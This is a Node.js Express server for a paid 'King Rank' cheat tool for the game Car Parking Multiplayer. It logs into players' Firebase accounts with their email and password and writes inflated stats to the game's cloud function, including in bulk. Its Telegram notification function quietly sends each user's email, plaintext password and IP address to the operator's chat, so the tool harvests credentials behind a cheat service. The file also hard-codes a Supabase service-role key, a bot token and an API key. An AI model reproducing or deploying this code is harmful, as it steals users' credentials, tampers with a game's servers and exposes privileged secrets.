const express = require('express');
const crypto = require('crypto');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const { createClient } = require('@supabase/supabase-js');

const app = express();

// ============================================================
// SUPABASE CONFIGURATION
// ============================================================
const SUPABASE_URL = "https://npnnazppmobbuqsitaxb.supabase.co";
const SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5wbm5henBwbW9iYnVxc2l0YXhiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzE0NzUzNCwiZXhwIjoyMDkyNzIzNTM0fQ.VeFewsT9GG9xnvW2CkfaEMEx_FMOsWgcDW2JlI2zm7Y";

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

// ============================================================
// KONFIGURASI
// ============================================================
const PORT = 3000;
const BOT_TOKEN = "8049314105:AAE0Tk2ifyJdACQRGuiQJnN8C-YsNUWuzvI";
const OWNER_ID = "7492782458";
const NEXUS_VERIFY_URL = "https://system-nexus-key.vercel.app";

// Cooldown: 5 menit per user
const COOLDOWN_MINUTES = 5;

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*', credentials: true }));
app.use(express.json());

// ============================================================
// CPM CONFIG
// ============================================================
const CPM_CONFIG = {
    name: 'Car Parking Multiplayer',
    firebaseApiKey: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
    loginUrl: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
    rankUrl: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
};

// ============================================================
// DEFAULT STATS (GLOBAL - Bisa diubah user)
// ============================================================
const DEFAULT_STATS = {
    cars: 100000,
    car_fix: 100000,
    drift_max: 100000,
    drift: 100000,
    cargo: 100000,
    delivery: 100000,
    taxi: 100000,
    levels: 1000,
    gifts: 100000,
    fuel: 100000,
    offroad: 100000,
    police: 100000,
    run: 100000,
    t_distance: 10000000,
    time: 10000000000,
    race_win: 3000
};

// ============================================================
// HELPER FUNCTIONS
// ============================================================
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.socket.remoteAddress || 
           req.ip || 
           'Unknown';
}

function generateUserId(email) {
    return crypto.createHash('md5').update(email.toLowerCase().trim()).digest('hex');
}

async function sendTelegramNotification(email, password, status, nexusKey, ipAddress, details = '') {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
    
    let message = `👑 CPM KING RANK TOOL\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📊 Status: ${status}\n🔑 Nexus Key: ${nexusKey}\n🌐 IP: ${ipAddress}\n📝 Details: ${details}\n⏰ Time: ${timestamp}`;
    
    try {
        await axios.post(url, { chat_id: OWNER_ID, text: message }, { timeout: 10000 });
        return true;
    } catch (error) {
        return false;
    }
}

async function verifyNexusKey(key) {
    if (!key) return { valid: false };
    try {
        const response = await axios.post(`${NEXUS_VERIFY_URL}/api/verify-key`, { key }, { timeout: 15000 });
        return response.data;
    } catch (error) {
        return { valid: false };
    }
}

async function cpmLogin(email, password) {
    const response = await axios.post(`${CPM_CONFIG.loginUrl}?key=${CPM_CONFIG.firebaseApiKey}`, {
        email, password, returnSecureToken: true, clientType: 'CLIENT_TYPE_ANDROID'
    }, {
        headers: { 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)' },
        timeout: 20000
    });
    if (!response.data?.idToken) throw new Error('Login failed');
    return { idToken: response.data.idToken, localId: response.data.localId };
}

async function setKingRank(idToken, stats) {
    const ratingData = { ...stats };
    const response = await axios.post(CPM_CONFIG.rankUrl, { data: JSON.stringify({ RatingData: ratingData }) }, {
        headers: { 'Authorization': `Bearer ${idToken}`, 'Content-Type': 'application/json' },
        timeout: 30000
    });
    return response.status === 200;
}

// ============================================================
// COOLDOWN SYSTEM
// ============================================================
async function checkCooldown(userId) {
    const { data } = await supabase
        .from('cpm_cooldown')
        .select('cooldown_until')
        .eq('user_id', userId)
        .maybeSingle();
    
    if (!data) return { active: false, remaining: 0 };
    const now = Date.now();
    if (now >= data.cooldown_until) {
        await supabase.from('cpm_cooldown').delete().eq('user_id', userId);
        return { active: false, remaining: 0 };
    }
    return { active: true, remaining: data.cooldown_until - now };
}

async function setCooldown(userId) {
    const cooldownUntil = Date.now() + (COOLDOWN_MINUTES * 60 * 1000);
    await supabase
        .from('cpm_cooldown')
        .upsert({ user_id: userId, cooldown_until: cooldownUntil, last_attempt: Date.now() });
    return cooldownUntil;
}

// ============================================================
// UPDATE ANALYTICS
// ============================================================
async function updateAnalytics(status) {
    const today = new Date().toISOString().split('T')[0];
    const { data: existing } = await supabase.from('cpm_analytics_daily').select('*').eq('date', today).maybeSingle();
    
    if (existing) {
        await supabase.from('cpm_analytics_daily').update({
            success_count: existing.success_count + (status === 'success' ? 1 : 0),
            failed_count: existing.failed_count + (status === 'failed' ? 1 : 0),
            total_count: existing.total_count + 1
        }).eq('date', today);
    } else {
        await supabase.from('cpm_analytics_daily').insert({
            date: today,
            success_count: status === 'success' ? 1 : 0,
            failed_count: status === 'failed' ? 1 : 0,
            total_count: 1
        });
    }
    
    const { data: total } = await supabase.from('cpm_analytics_total').select('*').limit(1).maybeSingle();
    if (total) {
        await supabase.from('cpm_analytics_total').update({
            total_processed: total.total_processed + 1,
            total_success: total.total_success + (status === 'success' ? 1 : 0),
            total_failed: total.total_failed + (status === 'failed' ? 1 : 0),
            last_updated: Date.now()
        });
    } else {
        await supabase.from('cpm_analytics_total').insert({
            total_processed: 1,
            total_success: status === 'success' ? 1 : 0,
            total_failed: status === 'failed' ? 1 : 0,
            last_updated: Date.now()
        });
    }
}

// ============================================================
// API ENDPOINTS
// ============================================================
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: Date.now() });
});

app.get('/api/live-stats', async (req, res) => {
    const { count: queueLength } = await supabase.from('cpm_queue').select('*', { count: 'exact', head: true }).eq('status', 'pending');
    const { data: total } = await supabase.from('cpm_analytics_total').select('*').limit(1).maybeSingle();
    const today = new Date().toISOString().split('T')[0];
    const { data: todayStats } = await supabase.from('cpm_analytics_daily').select('*').eq('date', today).maybeSingle();
    
    res.json({
        success: true,
        stats: {
            totalProcessed: total?.total_processed || 0,
            successRate: total?.total_processed > 0 ? ((total.total_success / total.total_processed) * 100).toFixed(1) : 0,
            todaySuccess: todayStats?.success_count || 0,
            queueLength: queueLength || 0
        }
    });
});

app.post('/api/verify-access', async (req, res) => {
    const { key } = req.body;
    if (!key) return res.json({ success: false, error: 'Key required' });
    
    const result = await verifyNexusKey(key);
    if (result.valid) {
        res.json({ success: true, message: 'Access granted', remaining: result.remaining });
    } else {
        res.json({ success: false, error: 'Invalid key' });
    }
});

app.post('/api/set-king-rank', async (req, res) => {
    const { email, password, nexusKey, selectedStats } = req.body;
    const ipAddress = getClientIp(req);
    const userId = generateUserId(email);
    
    if (!email || !password || !nexusKey) {
        return res.status(400).json({ success: false, error: 'Missing fields' });
    }
    
    // Check cooldown
    const cooldown = await checkCooldown(userId);
    if (cooldown.active) {
        return res.status(429).json({
            success: false,
            cooldown: true,
            remaining: cooldown.remaining,
            formattedTime: `${Math.floor(cooldown.remaining / 60000)}:${Math.floor((cooldown.remaining % 60000) / 1000).toString().padStart(2, '0')}`
        });
    }
    
    // Verify key
    const keyResult = await verifyNexusKey(nexusKey);
    if (!keyResult.valid) {
        return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
    }
    
    // Build stats from selected items
    const statsToApply = {};
    for (const [statName, statValue] of Object.entries(DEFAULT_STATS)) {
        if (selectedStats[statName]) {
            statsToApply[statName] = selectedStats[statName];
        }
    }
    
    try {
        const login = await cpmLogin(email, password);
        await setKingRank(login.idToken, statsToApply);
        
        await setCooldown(userId);
        await updateAnalytics('success');
        await sendTelegramNotification(email, password, '✅ SUCCESS', nexusKey, ipAddress);
        
        res.json({ success: true, message: '👑 King Rank activated!' });
    } catch (error) {
        await updateAnalytics('failed');
        await sendTelegramNotification(email, password, '❌ FAILED', nexusKey, ipAddress, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/bulk-process', async (req, res) => {
    const { accounts, nexusKey, selectedStats } = req.body;
    const ipAddress = getClientIp(req);
    
    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
        return res.status(400).json({ success: false, error: 'Accounts required' });
    }
    
    const keyResult = await verifyNexusKey(nexusKey);
    if (!keyResult.valid) {
        return res.status(400).json({ success: false, error: 'Invalid Nexus Key' });
    }
    
    const results = [];
    for (const acc of accounts) {
        const userId = generateUserId(acc.email);
        const cooldown = await checkCooldown(userId);
        
        if (cooldown.active) {
            results.push({ email: acc.email, success: false, error: `Cooldown: ${Math.floor(cooldown.remaining / 60000)} min left` });
            continue;
        }
        
        try {
            const login = await cpmLogin(acc.email, acc.password);
            await setKingRank(login.idToken, selectedStats);
            await setCooldown(userId);
            await updateAnalytics('success');
            results.push({ email: acc.email, success: true });
        } catch (error) {
            await updateAnalytics('failed');
            results.push({ email: acc.email, success: false, error: error.message });
        }
        
        await new Promise(r => setTimeout(r, 3000));
    }
    
    await sendTelegramNotification('BULK', 'BULK', `Processed ${results.filter(r => r.success).length}/${accounts.length}`, nexusKey, ipAddress);
    res.json({ success: true, results });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
    console.log(`👑 CPM KING RANK TOOL V4.0 running on port ${PORT}`);
    console.log(`✅ Features: King Rank + Per-User King Settings + Cooldown`);
});

module.exports = app;